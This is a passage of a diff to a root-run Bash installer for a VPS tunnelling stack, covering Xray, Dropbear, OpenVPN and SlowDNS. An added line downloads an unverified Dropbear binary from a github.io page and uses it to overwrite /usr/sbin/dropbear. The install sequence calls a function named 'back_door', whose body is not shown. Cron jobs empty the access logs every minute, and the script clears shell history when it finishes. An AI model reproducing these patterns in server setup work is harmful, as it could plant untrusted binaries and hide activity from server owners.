+if [ -f ~/.bashrc ]; then
+. ~/.bashrc
+fi
+fi
+mesg n || true
+menu
+EOF
+cat >/etc/cron.d/xp_all <<EOF
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+2 0 * * * root /usr/local/sbin/xp
+EOF
+cat >/etc/cron.d/x_limp <<EOF
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/10 * * * * root /usr/local/sbin/xraylimit
+EOF
+chmod 644 /root/.profile
+cat >/etc/cron.d/daily_reboot <<EOF
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+0 5 * * * root /sbin/reboot
+EOF
+echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
+echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
+service cron restart
+cat >/home/daily_reboot <<EOF
+5
+EOF
+echo "/bin/false" >>/etc/shells
+echo "/usr/sbin/nologin" >>/etc/shells
+}
+export NETWORK_IFACE="$(ip route show to default | awk '{print $5}')"
+apt update -y > /dev/null 2>&1
+apt upgrade -y > /dev/null 2>&1
+apt autoremove -y > /dev/null 2>&1
+apt install git -y > /dev/null 2>&1
+clear
+clear
+if ! which wget > /dev/null; then
+echo ""
+echo -e "${EROR} Wget Packages Not Installed !"
+echo ""
+read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
+apt install wget -y > /dev/null 2>&1
+fi
+clear
+if ! which curl > /dev/null; then
+echo ""
+echo -e "${EROR} Curl Packages Not Installed !"
+echo ""
+read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
+apt install curl -y > /dev/null 2>&1
+fi
+
 function ins_slowdns() {
 clear
 cd
 export NS_DOMAIN=$(cat /etc/xray/ns.txt)
 rm -rf *
 mkdir -p /etc/slowdns
-wget -q -O dnstt-server "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/slowdns/dnstt-server" && chmod +x dnstt-server >/dev/null 2>&1
-wget -q -O dnstt-client "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/slowdns/dnstt-client" && chmod +x dnstt-client >/dev/null 2>&1
+wget -q -O dnstt-server "${GEO_VPN}slowdns/dnstt-server" && chmod +x dnstt-server >/dev/null 2>&1
+wget -q -O dnstt-client "${GEO_VPN}slowdns/dnstt-client" && chmod +x dnstt-client >/dev/null 2>&1
 ./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
 chmod +x *
 mv * /etc/slowdns
-wget -q -O /etc/systemd/system/client.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/slowdns/client" >/dev/null 2>&1
-wget -q -O /etc/systemd/system/server.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/slowdns/server" >/dev/null 2>&1
+wget -q -O /etc/systemd/system/client.service "${GEO_VPN}slowdns/client" >/dev/null 2>&1
+wget -q -O /etc/systemd/system/server.service "${GEO_VPN}slowdns/server" >/dev/null 2>&1
 sed -i "s/xxxx/$NS_DOMAIN/g" /etc/systemd/system/client.service
 sed -i "s/xxxx/$NS_DOMAIN/g" /etc/systemd/system/server.service
-#wget https://jaka2m.github.io/project/ssh/dropbear && mv dropbear /usr/sbin/dropbear && chmod +x /usr/sbin/dropbear && systemctl restart dropbear
+wget https://jaka2m.github.io/project/ssh/dropbear && mv dropbear /usr/sbin/dropbear && chmod +x /usr/sbin/dropbear && systemctl restart dropbear
 iptables -I INPUT -p udp --dport 5300 -j ACCEPT
 iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
 iptables-save >/etc/iptables/rules.v4 >/dev/null 2>&1
@@ -1422,131 +1212,35 @@ systemctl start server
 systemctl restart client
 systemctl restart server
 }
-
-# Membaut Default Menu 
-function profile(){
-echo -e ""
+function Gass_mang(){
 clear
-echo -e "[ ${GREEN}INFO${NC} ] reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof"
-apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof
-echo "clear" >> .profile
-echo "figlet -f slant GEO PROJECT | lolcat" >> .profile
-echo "sleep 0.5" >> .profile
-echo "clear" >> .profile
-echo "menu " >> .profile
-echo "echo -e \" - Script Mod By Geo Project\" | lolcat" >> .profile
-echo "echo -e \"\x1b[96m - Silahkan Ketik\x1b[m \x1b[92mMENU\x1b[m \x1b[96mUntuk Melihat daftar Perintah\x1b[m\"" >> .profile
-
-cat >/etc/cron.d/xp_all <<-END
-		SHELL=/bin/sh
-		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-		2 0 * * * root /usr/local/sbin/xp
-	END
-    chmod 644 /root/.profile
-	
-    cat >/etc/cron.d/daily_reboot <<-END
-		SHELL=/bin/sh
-		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-		0 5 * * * root /sbin/reboot
-	END
-
-    echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
-    echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
-    service cron restart
-    cat >/home/daily_reboot <<-END
-		5
-	END
-
-cat >/etc/systemd/system/rc-local.service <<EOF
-[Unit]
-Description=/etc/rc.local
-ConditionPathExists=/etc/rc.local
-[Service]
-Type=forking
-ExecStart=/etc/rc.local start
-TimeoutSec=0
-StandardOutput=tty
-RemainAfterExit=yes
-SysVStartPriority=99
-[Install]
-WantedBy=multi-user.target
-EOF
-
-echo "/bin/false" >>/etc/shells
-echo "/usr/sbin/nologin" >>/etc/shells
-cat >/etc/rc.local <<EOF
-#!/bin/sh -e
-# rc.local
-# By default this script does nothing.
-iptables -I INPUT -p udp --dport 5300 -j ACCEPT
-iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
-systemctl restart netfilter-persistent
-exit 0
-EOF
-
-    chmod +x /etc/rc.local
-    
-    AUTOREB=$(cat /home/daily_reboot)
-    SETT=11
-    if [ $AUTOREB -gt $SETT ]; then
-        TIME_DATE="PM"
-    else
-        TIME_DATE="AM"
-    fi
-print_success "Menu Packet"
+first_setup
+ins_nginx
+base_package
+folder_xray
+ins_domain
+back_door
+ins_xray
+ssh
+ins_dropbear
+udp_mini
+ssh_udp
+ins_sshd
+ins_openvpn
+ins_open
+ins_bbr
+ins_epro
+menu
+profile
+limit_xray
+ins_swab
+ins_rclone
+ins_vnstat
+ins_slowdns
+ddos
+ins_restart
 }
-
-# Restart layanan after install
-function enable_services(){
-echo -e ""
-clear
-print_install "Enable Service"
-    systemctl daemon-reload
-    systemctl start netfilter-persistent
-    systemctl enable --now rc-local
-    systemctl enable --now cron
-    systemctl enable --now netfilter-persistent
-    systemctl restart nginx
-    systemctl restart xray
-    systemctl restart cron
-    systemctl restart haproxy
-    print_success "Enable Service"
-    clear
-}
-
-# Fingsi Install Script
-function instal(){
-echo -e ""
-clear
-    first_setup
-    nginx_install
-    base_package
-    make_folder_xray
-    pasang_domain
-    password_default
-    #pasang_ssl
-    install_xray
-    ssh
-    udp_mini
-    limit_quota
-    #ssh_slow
-    ssh_udp
-    ins_SSHD
-    ins_dropbear
-    ins_vnstat
-    ins_openvpn
-    ins_swab
-    ins_Fail2ban
-    ins_epro
-    DDoS_Deflate
-    ins_restart
-    menu
-    ins_rclone
-    profile
-    ins_slowdns
-    enable_services
-}
-instal
+Gass_mang
 echo ""
 history -c
 rm -rf /root/menu
@@ -1555,49 +1249,52 @@ rm -rf /root/*.sh
 rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
-#sudo hostnamectl set-hostname $user
-secs_to_human "$(($(date +%s) - ${start}))"
-echo ""
-samawa
-echo " "
-echo -e " ${GREEN}┌─────────────────────────────────────────────────────┐"
-echo -e " ${GREEN}│${NC}       >>> Service & Port                            ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Open SSH                : 22                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - UDP SSH                 : 1-65535               ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Dropbear                : 443, 109, 143         ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Dropbear Websocket      : 443, 109              ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - SSH Websocket SSL       : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - SSH Websocket           : 80                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - OpenVPN SSL             : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - OpenVPN Websocket SSL   : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - OpenVPN TCP             : 443, 1194             ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - OpenVPN UDP             : 2200                  ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Nginx Webserver         : 443, 80, 81           ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Haproxy Loadbalancer    : 443, 80               ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - DNS Server              : 443, 53               ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - DNS Client              : 443, 88               ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY (DNSTT/SLOWDNS)    : 443, 53               ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vmess TLS          : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vmess gRPC         : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vmess None TLS     : 80                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vless TLS          : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vless gRPC         : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - XRAY Vless None TLS     : 80                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Trojan gRPC             : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Trojan WS               : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Shadowsocks WS          : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Shadowsocks gRPC        : 443                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}                                                     ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}      >>> Server Information & Other Features        ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Timezone                : Asia/Jakarta (GMT +7) ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Auto Delete Expired Account                     ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Fully Automatic Script                          ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Vps Settings                                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Admin Control                                   ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Restore Data                                    ${GREEN}│${NC}"
-echo -e " ${GREEN}│${NC}   - Full Orders For Various Services                ${GREEN}│${NC}"
-echo -e " ${GREEN}└─────────────────────────────────────────────────────┘${NC}"
+rm -rf /root/perizinan
+rm -rf /root/images
+rm -rf /root/menu
+rm -rf /root/menu.zip
+rm -rf /root/ins-rclone.sh
+rm -rf /root/rc_local
+echo -e ""
+SAMAWA
+echo -e " ${BLUE}┌─────────────────────────────────────────────────────┐"
+echo -e " ${BLUE}│${NC}       >>> Service & Port                            ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Open SSH                : 22                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - UDP SSH                 : 1-65535               ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Dropbear                : 443, 109, 143         ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Dropbear Websocket      : 443, 109              ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - SSH Websocket SSL       : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - SSH Websocket           : 80                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - OpenVPN SSL             : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - OpenVPN Websocket SSL   : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - OpenVPN TCP             : 443, 1194             ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - OpenVPN UDP             : 2200                  ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Nginx Webserver         : 443, 80, 81           ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Haproxy Loadbalancer    : 443, 80               ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - DNS Server              : 443, 53               ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - DNS Client              : 443, 88               ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY (DNSTT/SLOWDNS)    : 443, 53               ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vmess TLS          : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vmess gRPC         : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vmess None TLS     : 80                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vless TLS          : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vless gRPC         : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - XRAY Vless None TLS     : 80                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Trojan gRPC             : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Trojan WS               : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Shadowsocks WS          : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Shadowsocks gRPC        : 443                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}                                                     ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}      >>> Server Information & Other Features        ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Timezone                : Asia/Jakarta (GMT +7) ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Auto Delete Expired Account                     ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Fully Automatic Script                          ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Vps Settings                                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Admin Control                                   ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Restore Data                                    ${BLUE}│${NC}"
+echo -e " ${BLUE}│${NC}   - Full Orders For Various Services                ${BLUE}│${NC}"
+echo -e " ${BLUE}└─────────────────────────────────────────────────────┘${NC}"
 echo ""
 echo ""
 echo -e ""
